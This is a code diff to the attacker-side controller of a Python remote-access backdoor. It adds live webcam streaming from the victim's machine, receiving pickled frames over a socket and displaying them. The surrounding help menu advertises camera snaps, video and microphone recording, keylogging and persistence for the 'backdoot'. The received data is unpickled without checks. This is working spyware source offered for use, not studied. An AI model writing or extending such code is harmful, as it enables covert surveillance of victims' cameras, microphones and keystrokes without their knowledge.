@@ -1,7 +1,12 @@
 import base64
 import json
+import multiprocessing
+import pickle
 import socket
 import struct
+import threading
+
+import cv2
 
 sc_count = 10
 cs_count = 10
@@ -66,6 +71,29 @@ def recvall(sock, n):
         data.extend(packet)
     return data
 
+def stream(stop):
+    data = b""
+    payload_size = struct.calcsize("Q")
+    while True:
+        while len(data) < payload_size:
+            packet = target.recv(4*1024) # 4K
+            if not packet: break
+            data+=packet
+        packed_msg_size = data[:payload_size]
+        data = data[payload_size:]
+        msg_size = struct.unpack("Q",packed_msg_size)[0]
+        
+        while len(data) < msg_size:
+            data += target.recv(4*1024)
+        frame_data = data[:msg_size]
+        data  = data[msg_size:]
+        frame = pickle.loads(frame_data)
+        cv2.imshow("RECEIVING VIDEO",frame)
+        key = cv2.waitKey(1) & 0xFF
+        if key  == ord('q') or stop():
+            # reliable_send("stop_stream")
+            break
+    
 
 def shell():
     global count
@@ -73,6 +101,8 @@ def shell():
     global cs_count
     global vd_count
     global mc_count
+    stop_threads = False
+    stream_thread = threading.Thread(target=stream, args =(lambda : stop_threads, ))
 
     while True:
         command = input("Shell#~"+str(ip)+": ")
@@ -89,6 +119,7 @@ def shell():
                     cam_snap           ==> Take a camera snap  
                     video <time>       ==> Capture video (time in seconds) 
                     mic <time>         ==> Voice recorder (time in seconds)
+                    stream             ==> Real time camera streaming 
                     keylog             ==> Start keylog program
                     dump_keylog        ==> Get the keylog file
                     persistance        ==> Make the backdoot persistant
@@ -151,6 +182,14 @@ def shell():
                 else:
                     screen.write(image_decoded)
                     mc_count += 1
+
+        elif command[:6] == "stream":
+            stream_thread.start()
+
+        elif command[:11] == "stop_stream":
+            stop_threads = True
+            reliable_send("stop_stream")
+            stream_thread.join()
 
         elif command[:6] == "keylog":
             continue
